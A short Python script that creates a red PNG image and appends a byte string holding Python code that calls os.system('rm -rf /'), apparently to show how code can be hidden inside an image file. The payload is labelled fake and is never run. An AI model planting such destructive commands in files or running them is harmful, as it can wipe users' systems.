from PIL import Image
import io

# Create a simple red image
img = Image.new('RGB', (100, 100), color='red')

# Fake malicious script (Just a string, not executed automatically)
malicious_code = b"import os\nos.system('rm -rf /')"

# Save the image in memory
img_bytes = io.BytesIO()
img.save(img_bytes, format='PNG')

# Write the image file with hidden code
with open("malicious_image.png", "wb") as f:
    f.write(img_bytes.getvalue() + malicious_code)

print("Malicious image generated: malicious_image.png")

